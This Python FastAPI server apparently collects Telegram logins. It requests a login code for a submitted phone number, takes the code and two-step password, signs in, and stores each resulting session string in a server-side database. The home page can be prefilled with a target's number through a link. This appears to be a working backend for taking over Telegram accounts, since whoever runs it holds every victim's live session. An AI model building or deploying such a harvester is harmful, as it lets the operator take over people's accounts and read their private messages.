import os
import sqlite3
from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.templating import Jinja2Templates
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import *

app = FastAPI()
templates = Jinja2Templates(directory=".")

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
DB = "sessions.db"

# IN-MEMORY CLIENTS: phone → client
CLIENTS = {}

def init_db():
    conn = sqlite3.connect(DB)
    conn.execute("CREATE TABLE IF NOT EXISTS sessions (phone TEXT UNIQUE, session TEXT)")
    conn.commit()
    conn.close()

init_db()

def save_session(phone, session_str):
    conn = sqlite3.connect(DB)
    conn.execute("REPLACE INTO sessions (phone, session) VALUES (?, ?)", (phone, session_str))
    conn.commit()
    conn.close()
    if phone in CLIENTS:
        del CLIENTS[phone]

@app.get("/", response_class=HTMLResponse)
async def home(request: Request):
    phone = request.query_params.get("phone")
    return templates.TemplateResponse("index.html", {"request": request, "phone": phone})

@app.post("/send")
async def send_code(phone: str = Form(...)):
    if phone in CLIENTS:
        return JSONResponse({"error": "Already in progress."})

    client = TelegramClient(StringSession(), API_ID, API_HASH)
    try:
        await client.connect()
        sent = await client.send_code_request(phone)
        CLIENTS[phone] = client  # SAVE CLIENT
        return JSONResponse({"ok": True, "hash": sent.phone_code_hash})
    except Exception as e:
        if client.is_connected():
            await client.disconnect()
        return JSONResponse({"error": str(e)})

@app.post("/verify")
async def verify(phone: str = Form(...), code: str = Form(...), pwd: str = Form("") ):
    if phone not in CLIENTS:
        return JSONResponse({"error": "Session expired. Resend code."})

    client = CLIENTS[phone]
    try:
        if pwd:
            await client.sign_in(phone, code, password=pwd)
        else:
            await client.sign_in(phone, code)
        session_str = client.session.save()
        await client.disconnect()
        save_session(phone, session_str)
        del CLIENTS[phone]
        return JSONResponse({"session": session_str})
    except SessionPasswordNeededError:
        return JSONResponse({"needs_password": True})
    except Exception as e:
        return JSONResponse({"error": str(e)})
    finally:
        if phone in CLIENTS and not client.is_connected():
            del CLIENTS[phone]
